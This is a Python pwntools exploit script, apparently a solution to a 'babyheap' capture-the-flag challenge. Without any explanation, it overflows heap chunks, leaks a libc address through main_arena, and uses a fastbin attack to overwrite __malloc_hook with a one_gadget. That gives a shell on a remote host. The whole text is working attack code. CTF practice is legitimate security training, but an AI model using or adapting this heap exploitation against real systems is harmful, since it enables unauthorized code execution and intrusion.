from pwn import *

#context.log_level = 'debug'
#ubuntu_16_04_4_off = 0x3c4b20 - 0xf1147
off = 0x3a5620 - 0x41374
def alloca(size):
    r.sendlineafter("Command: ", '1')
    r.sendlineafter("Size: ", str(size))

def fill(index, content):
    r.sendlineafter("Command: ", '2')
    r.sendlineafter("Index: ", str(index))
    r.sendlineafter("Size: ", str(len(content)))
    r.sendafter("Content: ", content)

def free(index):
    r.sendlineafter("Command: ", '3')
    r.sendlineafter("Index: ", str(index))

def dump(index):
    r.sendlineafter("Command: ", '4')
    r.sendlineafter("Index: ", str(index))
    r.recvuntil("Content: \n")
    content = r.recvline()
    return content

r = remote('192.168.203.131', 2017)
#r = process('./babyheap_69a42acd160ab67a68047ca3f9c390b9',
#        env = {'LD_PRELOAD': './libc.so.6_b86ec517ee44b2d6c03096e0518c72a1'}
#)
#gdb.attach(r, '''
#continue
#''')

alloca(16) # 0
alloca(96) # 1
alloca(16) # 2
alloca(16) # 3
alloca(256) # 4
alloca(512) # 5
#pause()

fill(2, (p64(0) * 3) + p64(0x41)) # wide 3 chunk
fill(4, (p64(0) * 3) + p64(0xf1)) # fake chunk in 4
free(3)
alloca(48) # 3
fill(3, (p64(0) * 3) + p64(0x111))
free(4)

main_arena_addr = u64(dump(3)[-9:-1]) - 0x58
print "[+] main_arena = 0x%x" % main_arena_addr
one_gadget = main_arena_addr - off
print "[+] one_gadget = 0x%x" % one_gadget
malloc_hook = main_arena_addr - 0x10
print "[+] __malloc_hook = 0x%x" % malloc_hook
fill(2, (p64(0) * 3) + p64(0x21))

# fastbin attack
free(1)
fill(0, (p64(0) * 3) + p64(0x71) + p64(malloc_hook - 0x20 - 3))
alloca(96) # 1
alloca(96) # 4
fill(4, '\0' * 3 + p64(0) * 2 + p64(one_gadget))
alloca(20)

r.interactive()
